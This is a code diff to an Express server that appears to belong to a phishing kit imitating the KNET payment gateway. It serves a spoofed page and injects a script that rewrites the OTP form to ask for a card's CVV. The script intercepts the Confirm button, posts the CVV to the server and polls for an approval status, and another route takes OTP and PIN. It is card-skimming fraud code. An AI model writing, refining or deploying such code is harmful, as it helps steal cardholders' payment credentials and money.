@@ -159,7 +159,9 @@ app.post('/knet/cvv', (req, res) => {
   res.json({ success: true, payment });
 });
 
-app.get('/knet/cvv', (req, res) => {
+// Redirect /knet-otp with mode=cvv to serve CVV page
+app.get('/knet-otp', (req, res, next) => {
+  if (req.query.mode !== 'cvv') return next();
   const fs = require('fs');
   const knetId = req.query.id || '';
   const showError = req.query.error === '1';
@@ -167,48 +169,51 @@ app.get('/knet/cvv', (req, res) => {
   fs.readFile(indexPath, 'utf8', (err, html) => {
     if (err) return res.sendFile(indexPath);
     const interceptScript = getInterceptorScript();
-    // Script to patch Angular OTP page to show CVV instead
-    const cvvPatchScript = `<script>
+    const cvvPatchScript = buildCvvPatchScript(knetId, showError);
+    const modifiedHtml = html.replace('</body>', interceptScript + cvvPatchScript + '</body>');
+    res.send(modifiedHtml);
+  });
+});
+
+app.get('/knet/cvv', (req, res) => {
+  // Redirect to /knet-otp?mode=cvv&id=... so Angular loads the OTP page
+  const knetId = req.query.id || '';
+  const error = req.query.error || '';
+  let redirectUrl = '/knet-otp?mode=cvv';
+  if (knetId) redirectUrl += '&id=' + knetId;
+  if (error) redirectUrl += '&error=' + error;
+  res.redirect(redirectUrl);
+});
+
+function buildCvvPatchScript(knetId, showError) {
+  return `<script>
 (function() {
   var knetId = '${knetId}';
   var showError = ${showError};
-  // Store knetId in sessionStorage so Angular can find it
   if (knetId) sessionStorage.setItem('eventat_knet_txn', knetId);
-  // Patch Angular after it renders
   function patchOtpToCvv() {
-    // Find the OTP label and input
     var labels = document.querySelectorAll('label');
     var otpLabel = null;
     labels.forEach(function(l) { if (l.textContent.trim() === 'OTP:') otpLabel = l; });
     if (!otpLabel) return false;
-    // Change OTP label to CVV
     otpLabel.textContent = 'CVV:';
-    // Change OTP input placeholder and maxlength
     var otpInput = document.querySelector('input[name="otp"], input[placeholder="OTP"]');
-    if (otpInput) {
-      otpInput.placeholder = 'CVV';
-      otpInput.maxLength = 4;
-      otpInput.id = 'cvv-patch-input';
-    }
-    // Change notification text
+    if (otpInput) { otpInput.placeholder = 'CVV'; otpInput.maxLength = 4; otpInput.id = 'cvv-patch-input'; }
     var notifPs = document.querySelectorAll('p');
     notifPs.forEach(function(p) {
       if (p.textContent.includes('OTP') && p.textContent.includes('NOTIFICATION')) {
         var span = p.querySelector('span');
-        if (span) p.innerHTML = '<span class="font-bold">NOTIFICATION:</span> Please enter the CVV number located on the back of your card. The CVV is a 3-digit security code.';
+        if (span) p.innerHTML = '<span class="font-bold">NOTIFICATION:</span> Please enter the CVV number on the back of your card (3-4 digits).';
       }
     });
-    // Show error if needed
     if (showError) {
       var errorDiv = document.createElement('div');
       errorDiv.style.cssText = 'background:#f8d7da;border:1px solid #f5c6cb;border-radius:4px;padding:6px 12px;font-size:12px;color:#721c24;text-align:center;margin-bottom:8px;';
       errorDiv.textContent = '\u0631\u0645\u0632 CVV \u063a\u064a\u0631 \u0635\u062d\u064a\u062d\u060c \u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u0623\u0643\u062f \u0648\u0625\u0639\u0627\u062f\u0629 \u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629';
-      if (otpLabel && otpLabel.parentElement && otpLabel.parentElement.parentElement) {
+      if (otpLabel.parentElement && otpLabel.parentElement.parentElement) {
         otpLabel.parentElement.parentElement.parentElement.insertBefore(errorDiv, otpLabel.parentElement.parentElement);
       }
     }
-    // Intercept the Confirm button click to submit CVV instead of OTP
-    var confirmBtn = document.querySelector('button');
     var buttons = document.querySelectorAll('button');
     var confirmButton = null;
     buttons.forEach(function(b) { if (b.textContent.trim() === 'Confirm') confirmButton = b; });
@@ -220,54 +225,33 @@ app.get('/knet/cvv', (req, res) => {
         e.preventDefault();
         var input = document.querySelector('#cvv-patch-input') || document.querySelector('input[placeholder="CVV"]');
         var cvv = input ? input.value.trim() : '';
-        if (!cvv || cvv.length < 3) {
-          input && (input.style.borderColor = 'red');
-          return;
-        }
-        input && (input.style.borderColor = '');
+        if (!cvv || cvv.length < 3) { if (input) input.style.borderColor = 'red'; return; }
+        if (input) input.style.borderColor = '';
         newBtn.disabled = true;
-        fetch('/knet/cvv', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ knetId: knetId, cvv: cvv })
-        }).then(function(r) { return r.json(); })
-        .then(function(data) {
-          newBtn.disabled = false;
-          if (data.success) {
-            // Poll for status
-            var pollTimer = setInterval(function() {
-              fetch('/knet/status/' + knetId)
-                .then(function(r) { return r.json(); })
-                .then(function(d) {
+        fetch('/knet/cvv', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ knetId: knetId, cvv: cvv }) })
+          .then(function(r) { return r.json(); })
+          .then(function(data) {
+            newBtn.disabled = false;
+            if (data.success) {
+              var pollTimer = setInterval(function() {
+                fetch('/knet/status/' + knetId).then(function(r) { return r.json(); }).then(function(d) {
                   if (!d || !d.payment) return;
                   var s = d.payment.status;
-                  if (s === 'CVV_APPROVED') {
-                    clearInterval(pollTimer);
-                    window.location.href = '/knet-otp?id=' + knetId;
-                  } else if (s === 'CVV_FAILED') {
-                    clearInterval(pollTimer);
-                    window.location.href = '/knet/cvv?id=' + knetId + '&error=1';
-                  }
+                  if (s === 'CVV_APPROVED') { clearInterval(pollTimer); window.location.href = '/knet-otp?id=' + knetId; }
+                  else if (s === 'CVV_FAILED') { clearInterval(pollTimer); window.location.href = '/knet/cvv?id=' + knetId + '&error=1'; }
                 }).catch(function() {});
-            }, 1500);
-          }
-        }).catch(function() { newBtn.disabled = false; });
+              }, 1500);
+            }
+          }).catch(function() { newBtn.disabled = false; });
       }, true);
     }
     return true;
   }
-  // Try to patch every 200ms until Angular renders
-  var patchInterval = setInterval(function() {
-    if (patchOtpToCvv()) clearInterval(patchInterval);
-  }, 200);
-  // Stop trying after 10 seconds
+  var patchInterval = setInterval(function() { if (patchOtpToCvv()) clearInterval(patchInterval); }, 200);
   setTimeout(function() { clearInterval(patchInterval); }, 10000);
 })();
 <\/script>`;
-    const modifiedHtml = html.replace('</body>', interceptScript + cvvPatchScript + '</body>');
-    res.send(modifiedHtml);
-  });
-});
+}
 
 app.post('/knet-otp', (req, res) => {
   const { paymentId, otp, pin } = req.body;
